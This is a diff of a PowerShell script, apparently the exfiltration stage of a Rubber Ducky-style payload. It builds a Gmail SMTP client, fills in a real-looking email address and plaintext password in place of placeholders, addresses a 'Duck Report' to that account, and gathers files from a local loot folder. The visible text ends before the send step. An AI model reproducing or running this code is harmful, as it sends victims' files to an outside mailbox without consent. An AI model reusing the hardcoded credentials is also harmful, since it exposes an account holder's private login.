@@ -1,10 +1,10 @@
 $SMTPServer = 'smtp.gmail.com'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUREMAIL@gmail.com', 'YOURPASSWORD');
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('reallymrbutts@gmail.com', 'Zdc34899!');
 $ReportEmail = New-Object System.Net.Mail.MailMessage
-$ReportEmail.From = 'YOUREMAIL@gmail.com'
-$ReportEmail.To.Add('YOUREMAIL@gmail.com')
+$ReportEmail.From = 'reallymrbutts@gmail.com'
+$ReportEmail.To.Add('reallymrbutts@gmail.com')
 $ReportEmail.Subject = 'Duck Report'
 $ReportEmail.Body = 'Attached is your duck report.... Quack' 
 $files=Get-ChildItem "C:\l\"
